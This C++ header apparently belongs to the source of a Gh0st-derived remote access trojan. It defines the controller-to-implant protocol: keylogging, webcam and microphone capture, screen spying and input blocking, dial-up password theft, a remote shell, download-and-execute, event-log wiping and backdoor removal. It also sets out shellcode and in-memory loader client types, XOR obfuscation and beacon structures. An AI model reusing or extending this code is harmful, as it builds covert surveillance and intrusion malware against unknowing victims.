#pragma once

#include <vector>
#include <string>
#include <iosfwd>
#include <iostream>
#include <sstream>
#include <string.h>
#include <map>
#include <numeric> 
#include <ctime>
#include <chrono>

#ifdef _WIN32
#include <concrt.h>
#include <corecrt_io.h>
#define MVirtualFree(a1, a2, a3) VirtualFree(a1, a2, a3)
#define MVirtualAlloc(a1, a2, a3, a4) VirtualAlloc(a1, a2, a3, a4)
#else // 使得该头文件在 LINUX 正常使用
#include <thread>
#define strcat_s strcat
#define sprintf_s sprintf
#define strcpy_s strcpy
#define __stdcall 
#define WINAPI 
#define TRUE 1
#define FALSE 0
#define skCrypt(p)
#define Mprintf printf
#define ASSERT(p)
#define AUTO_TICK_C(p)
#define AUTO_TICK(p)
#define OutputDebugStringA(p) printf(p)

#include <unistd.h>
#define Sleep(n) ((n) >= 1000 ? sleep((n) / 1000) : usleep((n) * 1000))

typedef int64_t __int64;
typedef uint32_t DWORD;
typedef int BOOL, SOCKET;
typedef unsigned int ULONG;
typedef unsigned int UINT;
typedef void VOID;
typedef unsigned char BYTE;
typedef BYTE* PBYTE, * LPBYTE;
typedef void* LPVOID, * HANDLE;

#define GET_PROCESS(a1, a2) 
#define MVirtualFree(a1, a2, a3) delete[]a1
#define MVirtualAlloc(a1, a2, a3, a4) new BYTE[a2]
#define CopyMemory memcpy
#define MoveMemory memmove

#define INVALID_SOCKET -1
#define SOCKET_ERROR -1
#define closesocket close
#define CloseHandle(p)
#define CancelIo(p) close(reinterpret_cast<intptr_t>(p))
#endif

#include <string>
#include <vector>
#include <time.h>

#ifndef _MAX_PATH
#define _MAX_PATH 260
#endif

// 以下2个数字需全局唯一，否则在生成服务时会出问题

#define FLAG_FINDEN "Hello, World!"

#define FLAG_GHOST	FLAG_FINDEN

// 当程序功能明显发生变化时，应该更新这个值，以便对被控程序进行区分
#define DLL_VERSION __DATE__		// DLL版本

#define TALK_DLG_MAXLEN 1024		// 最大输入字符长度

// 命令枚举列表
enum
{
	// 文件传输方式
	TRANSFER_MODE_NORMAL = 0x00,	// 一般,如果本地或者远程已经有，取消
	TRANSFER_MODE_ADDITION,			// 追加
	TRANSFER_MODE_ADDITION_ALL,		// 全部追加
	TRANSFER_MODE_OVERWRITE,		// 覆盖
	TRANSFER_MODE_OVERWRITE_ALL,	// 全部覆盖
	TRANSFER_MODE_JUMP,				// 覆盖
	TRANSFER_MODE_JUMP_ALL,			// 全部覆盖
	TRANSFER_MODE_CANCEL,			// 取消传送

	// 控制端发出的命令
	COMMAND_ACTIVED = 0x00,			// 服务端可以激活开始工作
	COMMAND_LIST_DRIVE,				// 列出磁盘目录
	COMMAND_LIST_FILES,				// 列出目录中的文件
	COMMAND_DOWN_FILES,				// 下载文件
	COMMAND_FILE_SIZE,				// 上传时的文件大小
	COMMAND_FILE_DATA,				// 上传时的文件数据
	COMMAND_EXCEPTION,				// 传输发生异常，需要重新传输
	COMMAND_CONTINUE,				// 传输正常，请求继续发送数据
	COMMAND_STOP,					// 传输中止
	COMMAND_DELETE_FILE,			// 删除文件
	COMMAND_DELETE_DIRECTORY,		// 删除目录
	COMMAND_SET_TRANSFER_MODE,		// 设置传输方式
	COMMAND_CREATE_FOLDER,			// 创建文件夹
	COMMAND_RENAME_FILE,			// 文件或文件改名
	COMMAND_OPEN_FILE_SHOW,			// 显示打开文件
	COMMAND_OPEN_FILE_HIDE,			// 隐藏打开文件

	COMMAND_SCREEN_SPY,				// 屏幕查看
	COMMAND_SCREEN_RESET,			// 改变屏幕深度
	COMMAND_ALGORITHM_RESET,		// 改变算法
	COMMAND_SCREEN_CTRL_ALT_DEL,	// 发送Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// 屏幕控制
	COMMAND_SCREEN_BLOCK_INPUT,		// 锁定服务端键盘鼠标输入
	COMMAND_SCREEN_BLANK,			// 服务端黑屏
	COMMAND_SCREEN_CAPTURE_LAYER,	// 捕捉层
	COMMAND_SCREEN_GET_CLIPBOARD,	// 获取远程剪贴版
	COMMAND_SCREEN_SET_CLIPBOARD,	// 设置远程剪帖版

	COMMAND_WEBCAM,					// 摄像头
	COMMAND_WEBCAM_ENABLECOMPRESS,	// 摄像头数据要求经过H263压缩
	COMMAND_WEBCAM_DISABLECOMPRESS,	// 摄像头数据要求原始高清模式
	COMMAND_WEBCAM_RESIZE,			// 摄像头调整分辩率，后面跟两个INT型的宽高
	COMMAND_NEXT,					// 下一步(控制端已经打开对话框)

	COMMAND_KEYBOARD,				// 键盘记录
	COMMAND_KEYBOARD_OFFLINE,		// 开启离线键盘记录
	COMMAND_KEYBOARD_CLEAR,			// 清除键盘记录内容

	COMMAND_AUDIO,					// 语音监听

	COMMAND_SYSTEM,					// 系统管理（进程，窗口....）
	COMMAND_PSLIST,					// 进程列表
	COMMAND_WSLIST,					// 窗口列表
	COMMAND_DIALUPASS,				// 拨号密码
	COMMAND_KILLPROCESS,			// 关闭进程
	COMMAND_SHELL,					// cmdshell
	COMMAND_SESSION,				// 会话管理（关机，重启，注销, 卸载）
	COMMAND_REMOVE,					// 卸载后门
	COMMAND_DOWN_EXEC,				// 其它功能 - 下载执行
	COMMAND_UPDATE_SERVER,			// 其它功能 - 下载更新
	COMMAND_CLEAN_EVENT,			// 其它管理 - 清除系统日志
	COMMAND_OPEN_URL_HIDE,			// 其它管理 - 隐藏打开网页
	COMMAND_OPEN_URL_SHOW,			// 其它管理 - 显示打开网页
	COMMAND_RENAME_REMARK,			// 重命名备注
	COMMAND_REPLAY_HEARTBEAT,		// 回复心跳包
	COMMAND_SERVICES,				// 服务管理
	COMMAND_REGEDIT,
	COMMAND_TALK,					// 即时消息验证
	COMMAND_UPDATE = 53,			// 客户端升级

	// 服务端发出的标识
	TOKEN_AUTH = 100,				// 要求验证
	TOKEN_HEARTBEAT,				// 心跳包
	TOKEN_LOGIN,					// 上线包
	TOKEN_DRIVE_LIST,				// 驱动器列表
	TOKEN_FILE_LIST,				// 文件列表
	TOKEN_FILE_SIZE,				// 文件大小，传输文件时用
	TOKEN_FILE_DATA,				// 文件数据
	TOKEN_TRANSFER_FINISH,			// 传输完毕
	TOKEN_DELETE_FINISH,			// 删除完毕
	TOKEN_GET_TRANSFER_MODE,		// 得到文件传输方式
	TOKEN_GET_FILEDATA,				// 远程得到本地文件数据
	TOKEN_CREATEFOLDER_FINISH,		// 创建文件夹任务完成
	TOKEN_DATA_CONTINUE,			// 继续传输数据
	TOKEN_RENAME_FINISH,			// 改名操作完成
	TOKEN_EXCEPTION,				// 操作发生异常

	TOKEN_BITMAPINFO,				// 屏幕查看的BITMAPINFO
	TOKEN_FIRSTSCREEN,				// 屏幕查看的第一张图
	TOKEN_NEXTSCREEN,				// 屏幕查看的下一张图
	TOKEN_CLIPBOARD_TEXT,			// 屏幕查看时发送剪帖版内容

	TOKEN_WEBCAM_BITMAPINFO,		// 摄像头的BITMAPINFOHEADER
	TOKEN_WEBCAM_DIB,				// 摄像头的图像数据

	TOKEN_AUDIO_START,				// 开始语音监听
	TOKEN_AUDIO_DATA,				// 语音监听数据

	TOKEN_KEYBOARD_START,			// 键盘记录开始
	TOKEN_KEYBOARD_DATA,			// 键盘记录的数据

	TOKEN_PSLIST,					// 进程列表
	TOKEN_WSLIST,					// 窗口列表
	TOKEN_DIALUPASS,				// 拨号密码
	TOKEN_SHELL_START,				// 远程终端开始
	TOKEN_SERVERLIST,               // 服务列表
	COMMAND_SERVICELIST,            // 刷新服务列表        
	COMMAND_SERVICECONFIG,          // 服务端发出的标识
	TOKEN_TALK_START,				// 即时消息开始
	TOKEN_TALKCMPLT,				// 即时消息可重发
	TOKEN_KEYFRAME=134,				// 关键帧

	TOKEN_REGEDIT = 200,            // 注册表
	COMMAND_REG_FIND,				// 注册表 管理标识
	TOKEN_REG_KEY,
	TOKEN_REG_PATH,
	COMMAND_BYE,					// 被控端退出
	SERVER_EXIT=205,				// 主控端退出

	SOCKET_DLLLOADER=210,           // 客户端请求DLL
	CMD_DLLDATA,                    // 响应DLL数据
	CMD_MASTERSETTING = 215,		// 主控设置
	CMD_HEARTBEAT_ACK = 216,		// 心跳回应
};

enum 
{
	CLIENT_TYPE_DLL = 0,			// 客户端代码以DLL运行
	CLIENT_TYPE_ONE = 1,			// 客户端代码以单个EXE运行
	CLIENT_TYPE_MEMEXE = -1,		// 内存EXE运行
	CLIENT_TYPE_MODULE = 2,			// DLL需由外部程序调用
	CLIENT_TYPE_SHELLCODE = 4,		// Shellcode
	CLIENT_TYPE_MEMDLL = 5,			// 内存DLL运行
	CLIENT_TYPE_LINUX = 6,			// LINUX 客户端
};

inline const char* GetClientType(int typ) {
	switch (typ)
	{
	case CLIENT_TYPE_DLL:
		return "DLL";
	case CLIENT_TYPE_ONE:
		return "EXE";
	case CLIENT_TYPE_MEMEXE:
		return "MEXE";
	case CLIENT_TYPE_MODULE:
		return "DLL";
	case CLIENT_TYPE_SHELLCODE:
		return "SC";
	case CLIENT_TYPE_MEMDLL:
		return "MDLL";
	case CLIENT_TYPE_LINUX:
		return "LNX";
	default:
		return "DLL";
	}
}

// 所连接的主控程序信息
typedef struct CONNECT_ADDRESS
{
public:
	char	        szFlag[32];
	char			szServerIP[100];
	char			szPort[8];
	int				iType;
	bool            bEncrypt;
	char            szBuildDate[12];
	int             iMultiOpen;
	char            szReserved[134]; // 占位，使结构体占据300字节

public:
	void SetType(int typ) {
		iType = typ;
	}
	const void* Flag() const {
		return szFlag;
	}
	int FlagLen() const {
		return strlen(szFlag);
	}
	const char* ServerIP()const {
		return szServerIP;
	}
	int ServerPort()const {
		return atoi(szPort);
	}
	int ClientType()const {
		return iType;
	}
	void SetServer(const char* ip, int port) {
		strcpy_s(szServerIP, ip);
		sprintf_s(szPort, "%d", port);
	}
	bool IsValid()const {
		return strlen(szServerIP) != 0 && atoi(szPort) > 0;
	}
	int Size() const {
		return sizeof(CONNECT_ADDRESS);
	}
} CONNECT_ADDRESS ;

// 服务上线后发送的计算机信息
// 此结构体一旦发生变化（比如大小），则以前版本的客户端无法连接新版主控.
// 新版客户端也无法连接老版本的主控程序.
// 为此，自20241228提交以来，为这个结构体预留字段，以便未来之不时之需
// 请勿再修改此结构体，除非你决定不再兼容以前的程序或者单独编写代码来兼容
typedef struct  LOGIN_INFOR
{
	unsigned char			bToken;									// 1.登陆信息
	char					OsVerInfoEx[156];						// 2.版本信息
	unsigned int			dwCPUMHz;								// 3.CPU主频
	char					moduleVersion[24];						// 4.DLL模块版本
	char					szPCName[_MAX_PATH];					// 5.主机名
	int						bWebCamIsExist;							// 6.是否有摄像头
	unsigned int			dwSpeed;								// 7.网速
	char					szStartTime[20];						// 8.启动时间
	char					szReserved[512];						// 9.保留字段

	LOGIN_INFOR(){
		memset(this, 0, sizeof(LOGIN_INFOR));
		bToken = TOKEN_LOGIN;
		strcpy_s(moduleVersion, DLL_VERSION);
	}
	LOGIN_INFOR& Speed(unsigned long speed) {
		dwSpeed = speed;
		return *this;
	}
}LOGIN_INFOR;

// 固定1024字节
typedef struct Heartbeat
{
	uint64_t Time;
	char ActiveWnd[512];
	int Ping;
	int HasSoftware;
	char Reserved[496];

	Heartbeat() {
		memset(this, 0, sizeof(Heartbeat));
	}
	Heartbeat(const std::string& s, int ping = 0) {
		auto system_ms = std::chrono::time_point_cast<std::chrono::milliseconds>(
			std::chrono::system_clock::now()
			);
		Time = system_ms.time_since_epoch().count();
		strcpy_s(ActiveWnd, s.c_str());
		Ping = ping;
		memset(Reserved, 0, sizeof(Reserved));
	}
	int Size() const {
		return sizeof(Heartbeat);
	}
}Heartbeat;

typedef struct HeartbeatACK {
	uint64_t Time;
	char Reserved[24];
}HeartbeatACK;

// 固定500字节
typedef struct MasterSettings {
	int         ReportInterval;             // 上报间隔
	int         Is64Bit;                    // 主控是否64位
	char        MasterVersion[12];          // 主控版本
	int			DetectSoftware;				// 检测软件
	char        Reserved[476];              // 预留
}MasterSettings;

enum 
{
	SOFTWARE_CAMERA = 0,
	SOFTWARE_TELEGRAM,

	SHELLCODE = 0,
	MEMORYDLL = 1,
};

typedef DWORD(__stdcall* PidCallback)(void);

inline const char* EVENTID(PidCallback pid) {
	static char buf[64] = { 0 };
	if (buf[0] == 0) {
		sprintf_s(buf, "SERVICE [%d] FINISH RUNNING", pid());
	}
	return buf;
}

#define EVENT_FINISHED EVENTID(GetCurrentProcessId)

inline void xor_encrypt_decrypt(unsigned char *data, int len, const std::vector<char>& keys) {
	for (char key : keys) {
		for (int i = 0; i < len; ++i) {
			data[i] ^= key;
		}
	}
}

inline std::tm ToPekingTime(const time_t* t) {
	// 获取当前时间（如果传入的指针为空）
	std::time_t now = (t == nullptr) ? std::time(nullptr) : *t;

	// 线程安全地转换为 UTC 时间
	std::tm utc_time{};

#ifdef _WIN32  // Windows 使用 gmtime_s
	if (gmtime_s(&utc_time, &now) != 0) {
		return { 0, 0, 0, 1, 0, 100 }; // 失败时返回 2000-01-01 00:00:00
	}
#else  // Linux / macOS 使用 gmtime_r
	if (gmtime_r(&now, &utc_time) == nullptr) {
		return { 0, 0, 0, 1, 0, 100 };
	}
#endif

	// 转换为北京时间（UTC+8）
	utc_time.tm_hour += 8;

	// 规范化时间（处理溢出，如跨天）
	std::mktime(&utc_time);

	return utc_time;
}

inline std::string ToPekingTimeAsString(const time_t* t) {
	auto pekingTime = ToPekingTime(t);
	char buffer[20];
	std::strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", &pekingTime);
	return buffer;
}

#ifdef _DEBUG
// 为了解决远程桌面屏幕花屏问题而定义的宏，仅调试时使用，正式版本没有
#define SCREENYSPY_IMPROVE 0
#define SCREENSPY_WRITE 0
#endif

#ifdef _WIN32

#ifdef _WINDOWS
#include <afxwin.h>
#else
#define WIN32_LEAN_AND_MEAN 
#include <windows.h>
#endif

// 将内存中的位图写入文件
inline bool WriteBitmap(LPBITMAPINFO bmpInfo, const void* bmpData, const std::string& filePrefix, int index = -1) {
	char path[_MAX_PATH];
	if (filePrefix.size() >= 4 && filePrefix.substr(filePrefix.size() - 4) == ".bmp") {
		strcpy_s(path, filePrefix.c_str());
	}
	else {
		sprintf_s(path, ".\\bmp\\%s_%d.bmp", filePrefix.c_str(), index == -1 ? clock() : index);
	}
	FILE* File = fopen(path, "wb");
	if (File) {
		BITMAPFILEHEADER fileHeader = { 0 };
		fileHeader.bfType = 0x4D42; // "BM"
		fileHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmpInfo->bmiHeader.biSizeImage;
		fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

		fwrite(&fileHeader, 1, sizeof(BITMAPFILEHEADER), File);
		fwrite(&bmpInfo->bmiHeader, 1, sizeof(BITMAPINFOHEADER), File);
		fwrite(bmpData, 1, bmpInfo->bmiHeader.biSizeImage, File);
		fclose(File);
		return true;
	}
	return false;
}

class MSG32 { // 自定义控制消息(32位)
public:
	uint32_t            hwnd;
	uint32_t            message;
	uint32_t            wParam;
	uint32_t            lParam;
	uint32_t            time;
	POINT               pt;

	MSG32(const void* buffer, int size) {
		if (size == sizeof(MSG32)) {
			memcpy(this, buffer, sizeof(MSG32));
		}
		else {
			memset(this, 0, sizeof(MSG32));
		}
	}

	MSG32() {
		memset(this, 0, sizeof(MSG32));
	}

	MSG32* Create(const void* buffer, int size) {
		if (size == sizeof(MSG32)) {
			memcpy(this, buffer, sizeof(MSG32));
		}
		else {
			memset(this, 0, sizeof(MSG32));
		}
		return this;
	}
};

// Windows 自定义的消息MSG在32位和64位系统下大小不同，导致跨平台架构远程控制异常
// 需要使用自定义的消息(统一采用64位windows 的MSG定义)
class MSG64 { // 自定义控制消息(64位)
public:
	uint64_t            hwnd;
	uint64_t            message;
	uint64_t            wParam;
	uint64_t            lParam;
	uint64_t            time;
	POINT               pt;

	MSG64(const MSG& msg) :hwnd((uint64_t)msg.hwnd), message(msg.message), wParam(msg.wParam),
		lParam(msg.lParam), time(msg.time), pt(msg.pt) {}

	MSG64(const MSG32& msg) :hwnd((uint64_t)msg.hwnd), message(msg.message), wParam(msg.wParam),
		lParam(msg.lParam), time(msg.time), pt(msg.pt) {}

	MSG64(const void* buffer, int size) {
		if (size == sizeof(MSG64)) {
			memcpy(this, buffer, sizeof(MSG64));
		}
		else {
			memset(this, 0, sizeof(MSG64));
		}
	}

	MSG64() {
		memset(this, 0, sizeof(MSG64));
	}

	MSG64* Create(const MSG32* msg32) {
		hwnd = msg32->hwnd;
		message = msg32->message;
		wParam = msg32->wParam;
		lParam = msg32->lParam;
		time = msg32->time;
		pt = msg32->pt;
		return this;
	}
};

#endif
